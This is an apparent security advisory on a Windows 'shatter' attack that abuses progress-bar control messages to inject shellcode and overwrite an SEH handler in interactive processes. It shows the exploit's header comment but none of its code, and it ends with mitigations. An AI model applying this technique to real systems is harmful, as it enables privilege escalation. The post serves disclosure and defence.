============================================================================

== Background ==

After we posted our first research post regarding overwriting SEH using
windows messages;
-archives.neohapsis.com/archives/vulnwatch/2003-q3/0059.html

Oliver Lavery posted about using the same technique against tab controls;
-downloads.securityfocus.com/vulnerabilities/exploits/mcafee-shatterseh2.c

Following is a sample program that demonstrates the same techniques been
used against the progress bar control. Although this method does work, we
were unable to find any 'system level' programs that had progress bars to
be exploited.

We are however releasing this so that developers of such programs are aware
that even non-interactive controls may be vulnerable to shatter type
attacks.

The code is almost identical except for the use of different messages which
we use to write our shellcode into a known writeable address. Then the SEH
handler is overwritten with the same address, and after causing an exception
the code is executed.

== Example Code ==
/***************************************************************************
* Progress Control Shatter exploit
*
* Demonstrates the use of Progress Control messages to;
* - inject shellcode to known location
* - overwrite 4 bytes of a critical memory address
*
* 3 Variables need to be set for proper execution.
* - tWindow is the title of the programs main window
* - sehHandler is the critical address to overwrite
* - shellcodeaddr is the data space to inject the code
*
* Local shellcode loads relevant addresses
* Try it out against any program with a progress bar
*
* Based on (and pretty much identical to)
*	mcafee-shatterseh2.c by
*   Oliver Lavery <oliver.lavery at sympatico.ca>

== Example Vulnerable Programs ==

>From our testing, any interactive process that has an accessible
progress bar is vulnerable.

== Solutions ==

See the iDEFENSE paper for some good solution examples.
- Limit the interactive system processes
- Filter the messages accepted by interactive system processes
